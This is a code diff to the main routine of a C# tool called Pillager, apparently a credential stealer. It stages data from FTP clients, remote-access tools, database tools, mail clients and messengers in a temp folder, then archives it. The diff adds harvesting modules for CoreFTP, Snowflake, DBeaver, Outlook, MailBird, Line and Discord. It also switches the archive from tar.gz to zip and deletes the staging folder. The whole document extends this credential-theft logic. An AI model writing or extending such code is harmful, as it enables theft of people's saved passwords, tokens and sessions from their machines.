@@ -15,7 +15,7 @@ namespace Pillager
         static void Main(string[] args)
         {
             string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
-            string savezippath = savepath + ".tar.gz";
+            string savezippath = savepath + ".zip";
             if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
@@ -33,6 +33,8 @@ namespace Pillager
             //FTP
             WinSCP.Save(savepath);
             FileZilla.Save(savepath);
+            CoreFTP.Save(savepath);
+            Snowflake.Save(savepath);
 
             //Tools
             MobaXterm.Save(savepath);
@@ -41,6 +43,7 @@ namespace Pillager
             RDCMan.Save(savepath);
             FinalShell.Save(savepath);
             SQLyog.Save(savepath);
+            DBeaver.Save(savepath);
 
             //Softwares
             VSCode.Save(savepath);
@@ -49,6 +52,8 @@ namespace Pillager
             //Mail
             MailMaster.Save(savepath);
             Foxmail.Save(savepath);
+            Outlook.Save(savepath);
+            MailBird.Save(savepath);
 
             //Messengers
             QQ.Save(savepath);
@@ -56,10 +61,18 @@ namespace Pillager
             Skype.Save(savepath);
             Enigma.Save(savepath);
             DingTalk.Save(savepath);
+            Line.Save(savepath);
+            Discord.Save(savepath);
 
-            //Tar.gz
-            Tar.Pack(savepath, savezippath);
-            Directory.Delete(savepath, true);
+            //Zip
+            ZipStorer zip = ZipStorer.Create(savezippath);
+            foreach (var item in Directory.GetDirectories(savepath))
+                zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
+            foreach (var item in Directory.GetFiles(savepath))
+                zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
+            zip.Close();
+
+           Directory.Delete(savepath, true);
         }
     }
 }
